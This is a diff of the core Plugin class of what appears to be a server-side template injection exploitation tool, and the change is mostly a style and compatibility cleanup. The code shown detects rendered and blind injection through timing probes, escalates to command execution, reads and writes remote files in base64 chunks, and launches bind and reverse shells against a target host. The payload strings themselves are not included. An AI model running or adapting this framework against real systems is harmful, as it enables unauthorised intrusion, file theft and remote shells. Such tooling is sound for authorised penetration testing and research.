@@ -4,30 +4,32 @@ import sys
 from utils.strings import chunkit, md5
 from utils import rand
 from utils.loggers import log
-import collections
 import re
 import itertools
 import base64
 import datetime
-import collections
+from collections import deque
+from collections.abc import Mapping
 import threading
 import time
 import utils.config
+
 
 def _recursive_update(d, u):
     # Update value of a nested dictionary of varying depth
 
     for k, v in u.items():
-        if isinstance(d, collections.Mapping):
-            if isinstance(v, collections.Mapping):
+        if isinstance(d, Mapping):
+            if isinstance(v, Mapping):
                 r = _recursive_update(d.get(k, {}), v)
                 d[k] = r
             else:
                 d[k] = u[k]
         else:
             d = {k: u[k]}
-            
+
     return d
+
 
 def compatible_url_safe_base64_encode(input):
     code_b64 = input
@@ -41,6 +43,7 @@ def compatible_url_safe_base64_encode(input):
         code_b64 = code_b64.decode(encoding='UTF-8')
 
     return code_b64
+
 
 class Plugin(object):
 
@@ -56,16 +59,16 @@ class Plugin(object):
         # tune the average response time for blind values.
 
         # Estimate 0.5s for a safe start.
-        self.render_req_tm = collections.deque([ 0.5 ], maxlen=5)
+        self.render_req_tm = deque([0.5], maxlen=5)
 
-        # The delay fortime-based blind injection. This will be added 
+        # The delay fortime-based blind injection. This will be added
         # to the average response time for render values.
         self.tm_delay = utils.config.time_based_blind_delay
-        
+
         # Declare object attributes
         self.actions = {}
         self.contexts = []
-        
+
         # Call user-defined inits
         self.language_init()
         self.init()
@@ -73,15 +76,14 @@ class Plugin(object):
     def language_init(self):
         # To be overriden. This can call self.update_actions
         # and self.set_contexts
-        
-        pass 
 
+        pass
 
     def init(self):
         # To be overriden. This can call self.update_actions
         # and self.set_contexts
-        
-        pass 
+
+        pass
 
     def rendered_detected(self):
 
@@ -90,7 +92,7 @@ class Plugin(object):
         test_os_code_expected = action_evaluate.get('test_os_expected')
 
         if test_os_code and test_os_code_expected:
-            
+
             os = self.evaluate(test_os_code)
 
             if os and re.search(test_os_code_expected, os):
@@ -101,19 +103,20 @@ class Plugin(object):
 
                 action_execute = self.actions.get('execute', {})
                 test_cmd_code = action_execute.get('test_cmd')
-                test_cmd_code_expected = action_execute.get('test_cmd_expected')
+                test_cmd_code_expected = action_execute.get(
+                    'test_cmd_expected')
 
                 if (
-                    test_cmd_code and 
+                    test_cmd_code and
                     test_cmd_code_expected and
                     test_cmd_code_expected == self.execute(test_cmd_code)
-                    ):
-                        self.set('execute', True)
-                        self.set('bind_shell', True)
-                        self.set('reverse_shell', True)
+                ):
+                    self.set('execute', True)
+                    self.set('bind_shell', True)
+                    self.set('reverse_shell', True)
 
     def blind_detected(self):
-        
+
         # Blind has been detected so code has been already evaluated
         self.set('evaluate_blind', self.language)
 
@@ -123,12 +126,11 @@ class Plugin(object):
             test_cmd_code and
             # self.execute_blind() returns true or false
             self.execute_blind(test_cmd_code)
-            ):
+        ):
             self.set('execute_blind', True)
             self.set('write', True)
             self.set('bind_shell', True)
             self.set('reverse_shell', True)
-
 
     def detect(self):
 
@@ -150,16 +152,16 @@ class Plugin(object):
 
                 # If here, the rendering is confirmed
                 prefix = self.get('prefix', '')
-                render = self.get('render', '%(code)s') % ({'code' : '*' })
+                render = self.get('render', '%(code)s') % ({'code': '*'})
                 suffix = self.get('suffix', '')
                 log.info('%s plugin has confirmed injection with tag \'%s%s%s\'' % (
                     self.plugin,
                     repr(prefix).strip("'"),
                     repr(render).strip("'"),
                     repr(suffix).strip("'"),
-                    )
                 )
-                
+                )
+
                 # Clean up any previous unreliable render data
                 self.delete('unreliable_render')
                 self.delete('unreliable')
@@ -181,7 +183,8 @@ class Plugin(object):
 
                 if self.get('blind'):
 
-                    log.info('%s plugin has confirmed blind injection' % (self.plugin))
+                    log.info('%s plugin has confirmed blind injection' %
+                             (self.plugin))
 
                     # Clean up any previous unreliable render data
                     self.delete('unreliable_render')
@@ -215,26 +218,30 @@ class Plugin(object):
                 closures = self._generate_closures(ctx)
 
                 log.info('%s plugin is testing %s*%s code context escape with %i variations%s' % (
-                                self.plugin,
-                                repr(ctx.get('prefix', '%(closure)s') % ( { 'closure' : '' } )).strip("'"),
-                                repr(suffix).strip("'"),
-                                len(closures),
-                                ' (level %i)' % (ctx.get('level', 1)) if self.get('level') else ''
-                        )
+                    self.plugin,
+                    repr(ctx.get('prefix', '%(closure)s') %
+                         ({'closure': ''})).strip("'"),
+                    repr(suffix).strip("'"),
+                    len(closures),
+                    ' (level %i)' % (ctx.get('level', 1)
+                                     ) if self.get('level') else ''
+                )
                 )
             else:
-                closures = [ '' ]
+                closures = ['']
 
             for closure in closures:
 
                 # Format the prefix with closure
-                prefix = ctx.get('prefix', '%(closure)s') % ( { 'closure' : closure } )
+                prefix = ctx.get('prefix', '%(closure)s') % (
+                    {'closure': closure})
 
                 yield prefix, suffix
 
     """
     Detection of unreliabe rendering tag with no header and trailer.
     """
+
     def _detect_unreliable_render(self):
 
         render_action = self.actions.get('render')
@@ -243,8 +250,8 @@ class Plugin(object):
 
         # Print what it's going to be tested
         log.debug('%s plugin is testing unreliable rendering on text context' % (
-                self.plugin
-            )
+            self.plugin
+        )
         )
 
         # Prepare base operation to be evalued server-side
@@ -254,20 +261,20 @@ class Plugin(object):
         # Probe with payload wrapped by header and trailer, no suffex or prefix.
         # Test if contained, since the page contains other garbage
         if expected in self.render(
-                code = payload,
-                header = '',
-                trailer = '',
-                header_rand = 0,
-                trailer_rand = 0,
-                prefix = '',
-                suffix = ''
-            ):
+            code=payload,
+            header='',
+            trailer='',
+            header_rand=0,
+            trailer_rand=0,
+            prefix='',
+            suffix=''
+        ):
 
             # Print if the first found unreliable renode
             if not self.get('unreliable_render'):
                 log.info('%s plugin has detected unreliable rendering with tag %s, skipping' % (
                     self.plugin,
-                    repr(render_action.get('render') % ({'code' : '*' })))
+                    repr(render_action.get('render') % ({'code': '*'})))
                 )
 
             self.set('unreliable_render', render_action.get('render'))
@@ -278,6 +285,7 @@ class Plugin(object):
     """
     Detection of the rendering tag and context.
     """
+
     def _detect_blind(self):
 
         action = self.actions.get('blind', {})
@@ -291,26 +299,26 @@ class Plugin(object):
 
         # Print what it's going to be tested
         log.info('%s plugin is testing blind injection' % (
-                    self.plugin
-                )
+            self.plugin
+        )
         )
 
         for prefix, suffix in self._generate_contexts():
 
             # Conduct a true-false test
             if not getattr(self, call_name)(
-                code = payload_true,
-                prefix = prefix,
-                suffix = suffix,
-                blind = True
+                code=payload_true,
+                prefix=prefix,
+                suffix=suffix,
+                blind=True
             ):
                 continue
-            detail = {'blind_true':self._inject_verbose}
+            detail = {'blind_true': self._inject_verbose}
             if getattr(self, call_name)(
-                code = payload_false,
-                prefix = prefix,
-                suffix = suffix,
-                blind = True
+                code=payload_false,
+                prefix=prefix,
+                suffix=suffix,
+                blind=True
             ):
                 continue
             detail['blind_false'] = self._inject_verbose
@@ -323,10 +331,10 @@ class Plugin(object):
             self.channel.detected('blind', detail)
             return
 
-
     """
     Detection of the rendering tag and context.
     """
+
     def _detect_render(self):
 
         render_action = self.actions.get('render')
@@ -335,9 +343,9 @@ class Plugin(object):
 
         # Print what it's going to be tested
         log.info('%s plugin is testing rendering with tag %s' % (
-                self.plugin,
-                repr(render_action.get('render') % ({'code' : '*' })),
-            )
+            self.plugin,
+            repr(render_action.get('render') % ({'code': '*'})),
+        )
         )
 
         for prefix, suffix in self._generate_contexts():
@@ -347,26 +355,27 @@ class Plugin(object):
 
             payload = render_action.get('test_render')
             header_rand = rand.randint_n(10)
-            header = render_action.get('header') % ({ 'header' : header_rand })
+            header = render_action.get('header') % ({'header': header_rand})
             trailer_rand = rand.randint_n(10)
-            trailer = render_action.get('trailer') % ({ 'trailer' : trailer_rand })
+            trailer = render_action.get('trailer') % (
+                {'trailer': trailer_rand})
 
             # First probe with payload wrapped by header and trailer, no suffex or prefix
             if expected == self.render(
-                    code = payload,
-                    header = header,
-                    trailer = trailer,
-                    header_rand = header_rand,
-                    trailer_rand = trailer_rand,
-                    prefix = prefix,
-                    suffix = suffix
-                ):
+                code=payload,
+                header=header,
+                trailer=trailer,
+                header_rand=header_rand,
+                trailer_rand=trailer_rand,
+                prefix=prefix,
+                suffix=suffix
+            ):
                 self.set('render', render_action.get('render'))
                 self.set('header', render_action.get('header'))
                 self.set('trailer', render_action.get('trailer'))
                 self.set('prefix', prefix)
                 self.set('suffix', suffix)
-                self.channel.detected('render', {'expected' : expected})
+                self.channel.detected('render', {'expected': expected})
                 return
 
     """
@@ -396,7 +405,8 @@ class Plugin(object):
 
             result = delta >= expected_delay
 
-            log.debug('[blind %s] code above took %s (%s-%s). %s is the threshold, returning %s' % (self.plugin, str(delta), str(end), str(start), str(expected_delay), str(result)))
+            log.debug('[blind %s] code above took %s (%s-%s). %s is the threshold, returning %s' %
+                      (self.plugin, str(delta), str(end), str(start), str(expected_delay), str(result)))
 
             self._inject_verbose = {
                 'result': result,
@@ -429,71 +439,74 @@ class Plugin(object):
         - self.actions.get() to be rendered
         
     """
+
     def render(self, code, **kwargs):
 
         # If header == '', do not send headers
         header_template = kwargs.get('header')
         if header_template != '':
-            
+
             header_template = kwargs.get('header', self.get('header'))
             if not header_template:
-                header_template = self.actions.get('render',{}).get('header')
-                
+                header_template = self.actions.get('render', {}).get('header')
+
             if header_template:
-                header_rand = kwargs.get('header_rand', self.get('header_rand', rand.randint_n(10)))
-                
+                header_rand = kwargs.get('header_rand', self.get(
+                    'header_rand', rand.randint_n(10)))
+
                 if '%(header)s' in header_template:
-                    header = header_template % ({ 'header' : header_rand })
+                    header = header_template % ({'header': header_rand})
                 else:
                     header = header_template
         else:
             header_rand = 0
             header = ''
 
-
         # If trailer == '', do not send headers
         trailer_template = kwargs.get('trailer')
         if trailer_template != '':
-                
+
             trailer_template = kwargs.get('trailer', self.get('trailer'))
             if not trailer_template:
-                trailer_template = self.actions.get('render',{}).get('trailer')
-                        
+                trailer_template = self.actions.get(
+                    'render', {}).get('trailer')
+
             if trailer_template:
-                trailer_rand = kwargs.get('trailer_rand', self.get('trailer_rand', rand.randint_n(10)))
+                trailer_rand = kwargs.get('trailer_rand', self.get(
+                    'trailer_rand', rand.randint_n(10)))
 
                 if '%(trailer)s' in trailer_template:
-                    trailer = trailer_template % ({ 'trailer' : trailer_rand })
+                    trailer = trailer_template % ({'trailer': trailer_rand})
                 else:
                     trailer = trailer_template
 
         else:
             trailer_rand = 0
             trailer = ''
-            
+
         payload_template = kwargs.get('render', self.get('render'))
         if not payload_template:
-            payload_template = self.actions.get('render',{}).get('render')
+            payload_template = self.actions.get('render', {}).get('render')
         if not payload_template:
             # Exiting, actions.render.render is not set
             return None
-        
-        payload = payload_template % ({ 'code': code })
-            
+
+        payload = payload_template % ({'code': code})
+
         prefix = kwargs.get('prefix', self.get('prefix', ''))
         suffix = kwargs.get('suffix', self.get('suffix', ''))
 
         blind = kwargs.get('blind', False)
-        
+
         injection = header + payload + trailer
-        
+
         # Save the average HTTP request time of rendering in order
         # to better tone the blind request timeouts.
         result_raw = self.inject(
-            code = injection,
-            prefix = prefix,
-            suffix = suffix,
-            blind = blind
+            code=injection,
+            prefix=prefix,
+            suffix=suffix,
+            blind=blind
         )
 
         if blind:
@@ -507,27 +520,28 @@ class Plugin(object):
 
             # Cut the result using the header and trailer if specified
             if header:
-                before,_,result_after = result_raw.partition(str(header_rand))
+                before, _, result_after = result_raw.partition(
+                    str(header_rand))
             if trailer and result_after:
-                result,_,after = result_after.partition(str(trailer_rand))
+                result, _, after = result_after.partition(str(trailer_rand))
 
             return result.strip() if result else result
 
     def set(self, key, value):
         self.channel.data[key] = value
 
-    def get(self, key, default = None):
+    def get(self, key, default=None):
         return self.channel.data.get(key, default)
-        
+
     def delete(self, key):
         if key in self.channel.data:
             del self.channel.data[key]
 
     def _generate_closures(self, ctx):
 
-        closures_dict = ctx.get('closures', { '0' : [] })
+        closures_dict = ctx.get('closures', {'0': []})
 
-        closures = [ ]
+        closures = []
 
         # Loop all the closure names
         for ctx_closure_level, ctx_closure_matrix in closures_dict.items():
@@ -541,15 +555,16 @@ class Plugin(object):
             if not force_level and ctx_closure_level > self.channel.args.get('level'):
                 continue
 
-            closures += [ ''.join(x) for x in itertools.product(*ctx_closure_matrix) ]
+            closures += [''.join(x)
+                         for x in itertools.product(*ctx_closure_matrix)]
 
         closures = sorted(set(closures), key=len)
 
         # Return it
         return closures
 
-
     """ Overridable function to get MD5 hash of remote files. """
+
     def md5(self, remote_path):
 
         action = self.actions.get('md5', {})
@@ -560,12 +575,12 @@ class Plugin(object):
         if not action or not payload or not call_name or not hasattr(self, call_name):
             return
 
-        execution_code = payload % ({ 'path' : remote_path })
+        execution_code = payload % ({'path': remote_path})
 
         result = getattr(self, call_name)(
-            code = execution_code,
+            code=execution_code,
         )
-        
+
         # Check md5 result format
         if re.match(r"([a-fA-F\d]{32})", result):
             return result
@@ -573,6 +588,7 @@ class Plugin(object):
             return None
 
     """ Overridable function to detect read capabilities. """
+
     def detect_read(self):
 
         # Assume read capabilities only if evaluation
@@ -583,6 +599,7 @@ class Plugin(object):
         self.set('read', True)
 
     """ Overridable function to read remote files. """
+
     def read(self, remote_path):
 
         action = self.actions.get('read', {})
@@ -600,10 +617,10 @@ class Plugin(object):
             log.warn('Error getting remote file md5, check presence and permission')
             return
 
-        execution_code = payload % ({ 'path' : remote_path })
+        execution_code = payload % ({'path': remote_path})
 
         data_b64encoded = getattr(self, call_name)(
-            code = execution_code,
+            code=execution_code,
         )
         data = base64.b64decode(data_b64encoded)
 
@@ -629,14 +646,16 @@ class Plugin(object):
         if self.get('blind') or self.md5(remote_path):
             if not self.channel.args.get('force_overwrite'):
                 if self.get('blind'):
-                    log.warn('Blind upload might overwrite files, run with --force-overwrite to continue')
+                    log.warn(
+                        'Blind upload might overwrite files, run with --force-overwrite to continue')
                 else:
-                    log.warn('Remote file already exists, run with --force-overwrite to overwrite')
+                    log.warn(
+                        'Remote file already exists, run with --force-overwrite to overwrite')
                 return
             else:
-                execution_code = payload_truncate % ({ 'path' : remote_path })
+                execution_code = payload_truncate % ({'path': remote_path})
                 getattr(self, call_name)(
-                    code = execution_code
+                    code=execution_code
                 )
 
         # Upload file in chunks of 500 characters
@@ -645,18 +664,19 @@ class Plugin(object):
             log.debug('[b64 encoding] %s' % chunk)
             chunk_b64 = base64.urlsafe_b64encode(chunk)
 
-            execution_code = payload_write % ({ 'path' : remote_path, 'chunk_b64' : chunk_b64 })
+            execution_code = payload_write % (
+                {'path': remote_path, 'chunk_b64': chunk_b64})
             getattr(self, call_name)(
-                code = execution_code
+                code=execution_code
             )
 
         if self.get('blind'):
-            log.warn('Blind upload can\'t check the upload correctness, check manually')
+            log.warn(
+                'Blind upload can\'t check the upload correctness, check manually')
         elif not md5(data) == self.md5(remote_path):
             log.warn('Remote file md5 mismatch, check manually')
         else:
             log.warn('File uploaded correctly')
-
 
     def evaluate(self, code,  **kwargs):
 
@@ -674,15 +694,16 @@ class Plugin(object):
 
         if '%(code_b64)s' in payload:
             log.debug('[b64 encoding] %s' % code)
-            execution_code = payload % ({ 'code_b64' : compatible_url_safe_base64_encode(code) })
+            execution_code = payload % (
+                {'code_b64': compatible_url_safe_base64_encode(code)})
         else:
-            execution_code = payload % ({ 'code' : code })
+            execution_code = payload % ({'code': code})
 
         return getattr(self, call_name)(
-            code = execution_code,
-            prefix = prefix,
-            suffix = suffix,
-            blind = blind
+            code=execution_code,
+            prefix=prefix,
+            suffix=suffix,
+            blind=blind
         )
 
     def execute(self, code, **kwargs):
@@ -701,18 +722,18 @@ class Plugin(object):
 
         if '%(code_b64)s' in payload:
             log.debug('[b64 encoding] %s' % code)
-            execution_code = payload % ({ 'code_b64' : compatible_url_safe_base64_encode(code) })
+            execution_code = payload % (
+                {'code_b64': compatible_url_safe_base64_encode(code)})
         else:
-            execution_code = payload % ({ 'code' : code })
+            execution_code = payload % ({'code': code})
 
         result = getattr(self, call_name)(
-            code = execution_code,
-            prefix = prefix,
-            suffix = suffix,
-            blind = blind
+            code=execution_code,
+            prefix=prefix,
+            suffix=suffix,
+            blind=blind
         )
         return result.replace('\\n', '\n')
-
 
     def evaluate_blind(self, code, **kwargs):
 
@@ -733,19 +754,19 @@ class Plugin(object):
         if '%(code_b64)s' in payload_action:
             log.debug('[b64 encoding] %s' % code)
             execution_code = payload_action % ({
-                'code_b64' : compatible_url_safe_base64_encode(code),
-                'delay' : expected_delay
+                'code_b64': compatible_url_safe_base64_encode(code),
+                'delay': expected_delay
             })
         else:
             execution_code = payload_action % ({
-                'code' : code,
-                'delay' : expected_delay
+                'code': code,
+                'delay': expected_delay
             })
 
         return getattr(self, call_name)(
-            code = execution_code,
-            prefix = prefix,
-            suffix = suffix,
+            code=execution_code,
+            prefix=prefix,
+            suffix=suffix,
             blind=True
         )
 
@@ -768,19 +789,19 @@ class Plugin(object):
         if '%(code_b64)s' in payload_action:
             log.debug('[b64 encoding] %s' % code)
             execution_code = payload_action % ({
-                'code_b64' : compatible_url_safe_base64_encode(code),
-                'delay' : expected_delay
+                'code_b64': compatible_url_safe_base64_encode(code),
+                'delay': expected_delay
             })
         else:
             execution_code = payload_action % ({
-                'code' : code,
-                'delay' : expected_delay
+                'code': code,
+                'delay': expected_delay
             })
 
         return getattr(self, call_name)(
-            code = execution_code,
-            prefix = prefix,
-            suffix = suffix,
+            code=execution_code,
+            prefix=prefix,
+            suffix=suffix,
             blind=True
         )
 
@@ -792,8 +813,7 @@ class Plugin(object):
         # Set delay to 2 second over the average timing
         return average + self.tm_delay
 
-
-    def bind_shell(self, port, shell = "/bin/sh"):
+    def bind_shell(self, port, shell="/bin/sh"):
 
         action = self.actions.get('bind_shell', {})
         payload_actions = action.get('bind_shell')
@@ -806,16 +826,16 @@ class Plugin(object):
         for payload_action in payload_actions:
 
             execution_code = payload_action % ({
-                'port' : port,
-                'shell' : shell,
+                'port': port,
+                'shell': shell,
             })
 
-            reqthread = threading.Thread(target=getattr(self, call_name), args=(execution_code,))
+            reqthread = threading.Thread(target=getattr(
+                self, call_name), args=(execution_code,))
             reqthread.start()
             yield reqthread
 
-
-    def reverse_shell(self, host, port, shell = "/bin/sh"):
+    def reverse_shell(self, host, port, shell="/bin/sh"):
 
         action = self.actions.get('reverse_shell', {})
         payload_actions = action.get('reverse_shell')
@@ -828,12 +848,13 @@ class Plugin(object):
         for payload_action in payload_actions:
 
             execution_code = payload_action % ({
-                'port' : port,
-                'shell' : shell,
+                'port': port,
+                'shell': shell,
                 'host': host,
             })
 
-            reqthread = threading.Thread(target=getattr(self, call_name), args=(execution_code,))
+            reqthread = threading.Thread(target=getattr(
+                self, call_name), args=(execution_code,))
             reqthread.start()
 
     def update_actions(self, actions):
@@ -852,4 +873,3 @@ class Plugin(object):
 
         # Update contexts on the instance
         self.contexts = contexts
-
